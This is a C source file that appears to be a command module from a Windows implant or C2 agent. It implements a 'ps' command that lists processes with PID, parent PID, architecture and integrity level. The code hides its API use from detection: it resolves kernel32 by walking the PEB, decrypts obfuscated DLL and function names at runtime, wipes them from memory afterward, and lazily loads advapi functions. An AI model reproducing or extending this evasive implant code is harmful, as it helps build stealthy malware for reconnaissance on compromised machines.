#include "commands.h"
#include "adv_lazy.h"
#include "peb_walk.h"
#include "evs_strings.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* list running processes with PID, PPID, arch and integrity */

typedef BOOL (WINAPI *IsWow64Process_t)(HANDLE, PBOOL);
static IsWow64Process_t s_wow64 = NULL;

static void _init_wow64(void)
{
    if (s_wow64) return;
    char _dn[13], _fn[16];
    EVS_D(_dn, EVS_dll_kernel32); EVS_D(_fn, EVS_fn_IsWow64Process);
    HMODULE k32 = _peb_module(_dn); SecureZeroMemory(_dn, sizeof(_dn));
    if (k32) s_wow64 = (IsWow64Process_t)(void *)GetProcAddress(k32, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));
}

static const char *_arch(HANDLE hproc)
{
    _init_wow64();
    if (!s_wow64) return "?";
    BOOL wow64 = FALSE;
    return (s_wow64(hproc, &wow64) && wow64) ? "x86" : "x64";
}

static const char *_integrity(HANDLE hproc)
{
    HANDLE htoken = NULL;
    { const adv_api_t *_a = adv_get();
      if (!_a->OpenProcessToken || !_a->OpenProcessToken(hproc, TOKEN_QUERY, &htoken))
          return "?"; }

    DWORD needed = 0;
    GetTokenInformation(htoken, TokenIntegrityLevel, NULL, 0, &needed);
    if (!needed) { CloseHandle(htoken); return "?"; }

    TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)malloc(needed);
    if (!tml) { CloseHandle(htoken); return "?"; }

    const char *label = "?";
    if (GetTokenInformation(htoken, TokenIntegrityLevel, tml, needed, &needed)) {
        DWORD rid = *GetSidSubAuthority(tml->Label.Sid,
                        (DWORD)(*GetSidSubAuthorityCount(tml->Label.Sid) - 1));
        if      (rid >= SECURITY_MANDATORY_SYSTEM_RID)      label = "system";
        else if (rid >= SECURITY_MANDATORY_HIGH_RID)        label = "high";
        else if (rid >= SECURITY_MANDATORY_MEDIUM_RID)      label = "med";
        else if (rid >= SECURITY_MANDATORY_LOW_RID)         label = "low";
        else                                                 label = "untrust";
    }
    free(tml);
    CloseHandle(htoken);
    return label;
}

int cmd_ps(char *output_buf, size_t output_size)
{
    if (!output_buf || output_size < 128) return -1;
    output_buf[0] = '\0';

    int hdr = snprintf(output_buf, output_size,
        "%-8s %-8s %-5s %-8s %s\n"
        "%-8s %-8s %-5s %-8s %s\n",
        "PID", "PPID", "ARCH", "INTEGR.", "NAME",
        "---", "----", "----", "-------", "----");
    if (hdr < 0 || (size_t)hdr >= output_size) return 0;

    size_t off = (size_t)hdr;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        snprintf(output_buf + off, output_size - off, "[ps] snapshot failed\n");
        return -1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (!Process32First(snap, &pe)) { CloseHandle(snap); return -1; }

    do {
        const char *arch  = "?";
        const char *integ = "?";

        HANDLE hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                   FALSE, pe.th32ProcessID);
        if (hproc) {
            arch  = _arch(hproc);
            integ = _integrity(hproc);
            CloseHandle(hproc);
        }

        int n = snprintf(output_buf + off, output_size - off,
                         "%-8lu %-8lu %-5s %-8s %s\n",
                         (unsigned long)pe.th32ProcessID,
                         (unsigned long)pe.th32ParentProcessID,
                         arch, integ, pe.szExeFile);
        if (n > 0) off += (size_t)n;

        if (off + 128 >= output_size) {
            snprintf(output_buf + off, output_size - off, "[...truncated]\n");
            break;
        }

    } while (Process32Next(snap, &pe));

    CloseHandle(snap);
    return 0;
}
